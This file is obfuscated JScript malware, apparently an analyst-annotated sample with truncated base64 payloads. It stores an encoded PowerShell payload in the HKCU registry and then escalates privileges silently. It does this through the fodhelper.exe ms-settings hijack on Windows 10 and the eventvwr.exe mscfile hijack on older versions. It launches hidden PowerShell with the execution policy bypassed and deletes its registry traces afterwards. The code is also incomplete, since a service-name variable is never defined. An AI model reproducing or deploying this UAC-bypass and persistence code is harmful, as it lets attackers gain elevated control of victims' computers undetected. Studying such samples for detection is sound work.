function getServiceStatus(name) {
  var dhplxkkouq = GetObject("winmgmts:").ExecQuery("SELECT * FROM Win32_Service WHERE Name='" + name + "'");
  akpcrf = new Enumerator(dhplxkkouq);
  zmubfuo = akpcrf.item();
  var vguavnyxlp = '';
  try {
    vguavnyxlp = zmubfuo.State;
  } catch (e) {}
  if (vguavnyxlp == 'Running') {
    return true;
  } else {
    return false;
  }
}

var shellObject = WScript.CreateObject("shell.application");
var wScriptObject = new ActiveXObject("WScript.Shell");
var mtvunslh = GetObject("winmgmts:\\\\.\\root\\CIMV2");
var hewjay = mtvunslh.ExecQuery("SELECT * FROM Win32_OperatingSystem", "WQL", 0x10 | 0x20);
var yhqpykwg = new Enumerator(hewjay);
var yjiofgrdfx = yhqpykwg.item();
var systemDirectoryPath = yjiofgrdfx.SystemDirectory;
var daiofhmsnh = yjiofgrdfx.Version;
var arr = daiofhmsnh.split(".");

// base64 encoded unicode string
var zrynfhnwsub = 'QQBk...H0A';

wScriptObject.RegWrite("HKEY_CURRENT_USER\\Software\\capvzgf\\cazysa", zrynfhnwsub, "REG_SZ");
// long unicode encoded strings when decoded looks like below
// (Get-ItemProperty -path 'HKCU:\SOFTWARE\capvzgf').cazysa
var djziapwzi = systemDirectoryPath + '\\WindowsPowerShell\\v1.0\\powershell.exe -nologo -noprofile -ExecutionPolicy ByPass -w hidden -EncodedCommand WwB.....AA==';
if (arr[0] == '10') {
  wScriptObject.RegWrite("HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\shell\\open\\command\\", djziapwzi, "REG_SZ");
  wScriptObject.RegWrite("HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\shell\\open\\command\\DelegateExecute", "", "REG_SZ");
  shellObject.ShellExecute("explorer.exe", '"' + systemDirectoryPath + '\\fodhelper.exe"', "", "open", 0);
  WScript.sleep(5000);
  wScriptObject.RegDelete("HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\shell\\open\\command\\");
} else {
  if (arr[0] == '6') {
    wScriptObject.RegWrite("HKEY_CURRENT_USER\\Software\\Classes\\mscfile\\shell\\open\\command\\", djziapwzi, "REG_SZ");
    shellObject.ShellExecute("explorer.exe", '"' + systemDirectoryPath + '\\eventvwr.exe"', "", "open", 0);
    WScript.sleep(5000);
    wScriptObject.RegDelete("HKEY_CURRENT_USER\\Software\\Classes\\mscfile\\shell\\open\\command\\");
  }
}

var iii = 0;
while (true) {
  if (getServiceStatus(swmzra)) {
    WScript.sleep(100);
  } else {
    break;
  }
  iii = iii + 1;
  if (iii == 600) {
    break;
  }
}
